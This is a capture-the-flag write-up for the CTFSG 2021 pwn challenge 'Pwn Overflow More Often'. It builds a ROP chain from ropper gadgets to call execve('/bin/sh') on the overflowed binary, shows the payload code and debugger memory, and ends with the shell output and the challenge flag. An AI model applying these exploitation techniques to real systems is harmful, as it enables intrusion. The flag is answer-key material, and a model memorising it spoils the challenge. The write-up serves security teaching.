---
layout: writeup
ctf: CTFSG CTF 2021
chal: Pwn Overflow More Often
category: pwn
flag: CTFSG{g@dg3tRy_W1z@rdry_tO_pWn_g0l@nG}
points: 992
solves: 3
---

> Many-Many-More reasons for you to love POMO! Port over your number with us today to get a free gift of any gadget you want! Our telco backbone is powered by a super secure modern programming language which means you don't need to worry about being hacked! Your data is definitely safe with us!

Files given:
 - [pomo](pomo)

When we send in a long list of `"A"` as input, we see that the program segfaults and even gives us a traceback. This tells us we probably have to ROP the program.

Using ropper, one can dump all the gadgets to a file with `ropper --nocolor -f pomo > gadgets`. Gadgets: [gadgets](gadgets)

To call `execve("/bin/sh")`, we need
 - `rdi` points to `/bin/sh\x00` string
 - `rax = 0x3b` 
 - `rdx = 0` 
 - `rsi = 0` 

Furthermore, if we inspect the stack hard enough, we see that we only have 12 4-byte chunks that we can overwrite, meaning that we need to be extremely efficient with this rop chain.

## Finding gadgets

To get values into registers, `pop` is the easiest way to do so (`mov,`xor`,etc. may be more efficient but I couldn't find the appropriate gadgets). We easily find most of the pop instructions we need with a simple grep:

```sh
> cat gadgets | grep ': pop ...; ret;'
0x0000000000403c0d: pop rax; ret;
0x00000000004648ad: pop rbp; ret;
0x0000000000407fa1: pop rbx; ret;
0x00000000004188e2: pop rdx; ret;
0x00000000004387be: pop rsi; ret;
0x000000000041792b: pop rsp; ret;
```

however we are missing `pop rdi`. Unfortunately there is not convenient gadgets for `pop rdi`, and we have to use one of the following:
```sh
> cat gadgets | grep ': pop rdi; '
0x000000000041003d: pop rdi; dec dword ptr [rax + 0x21]; ret;
0x0000000000457ca4: pop rdi; sete byte ptr [rsp + 0x10]; ret;
```

The first would be hard to use as we need `rax` to point to a writable location, which takes at least 2 more 4-byte chunks.

In this case, we can use the second option as `sete` would set `byte ptr [rsp + 0x10]` to `0`, so if we can properly align our payload, this could be equivalent to a `nop`.

Next we need a gadget to write `/bin/sh\x00` as a string somewhere. It turns out that one such gadget exists!

```sh
> cat gadgets | grep ': mov qword ptr \[...\], ...; ret;'
0x0000000000463f6f: mov qword ptr [rdi], rax; ret;
```

and finally we need a syscall gadget:

```sh
> cat gadgets | grep ': syscall; ret;'
0x00000000004648e9: syscall; ret;
```

This leaves us with the following gadgets:

```py
mov_write = p64(0x0000000000463f6f) # mov qword ptr [rdi], rax; ret;
pop_rdi = p64(0x0000000000457ca4) # pop rdi; sete byte ptr [rsp + 0x10]; ret;
pop_rax = p64(0x0000000000403c0d) # pop rax; ret;
pop_rbp = p64(0x00000000004648ad) # pop rbp; ret;
pop_rbx = p64(0x0000000000407fa1) # pop rbx; ret;
pop_rdx = p64(0x00000000004188e2) # pop rdx; ret;
pop_rsi = p64(0x00000000004387be) # pop rsi; ret;
pop_rsp = p64(0x000000000041792b) # pop rsp; ret;
syscall = p64(0x00000000004648e9) # syscall; ret;
```

## Crafting rop chain

First we need to get `rdi` to point to a `/bin/sh\x00` string. We can easily find some writable memory, for example at `0x556a20` and use that to place our string:

```py
payload += pop_rax
payload += '/bin/sh\x00'
payload += pop_rdi
payload += bss
payload += mov_write
```

We need to be careful here as `pop_rdi` will zero out the 16th byte after it, hence here is a good place to pop a 0 into one of the registers. With this, we pop the values then call syscall in the follwing order:

```py
payload += pop_rdx
payload += p64(0)
payload += pop_rax
payload += p64(0x3b)
payload += pop_rsi
payload += p64(0)
payload += syscall
```

However when we run the script, we still get a segfault. Breaking right before the ROP chain, we see that somehow part of our padding got copied over into our rop chain:

```sh
0xc00005af10:	0x00403c0d	0x00000000	0x6e69622f	0x0068732f
0xc00005af20:	0x00457ca4	0x00000000	0x61616167	0x61616168
0xc00005af30:	0x61616169	0x6161616a	0x6161616b	0x6161616c
0xc00005af40:	0x00000000	0x00000000	0x00403c0d	0x00000000
0xc00005af50:	0x0000003b	0x00000000	0x004387be	0x00000000
0xc00005af60:	0x00000000	0x00000000	0x004648e9	0x00000000
```

This can easily be patched by replacing that part of our padding with the proper values, then we get a working exploit:

```sh
[*] Switching to interactive mode
Welcome to the Pwn Overflow More Often (POMO) telecom service.
Please enter your desired mobile no.: $
$ id
uid=1000(pomo) gid=1000(pomo) groups=1000(pomo)
$ cat /home/pomo/flag.txt
CTFSG{g@dg3tRy_W1z@rdry_tO_pWn_g0l@nG}
```

The solution script can be found at [exploit.py](exploit.py)
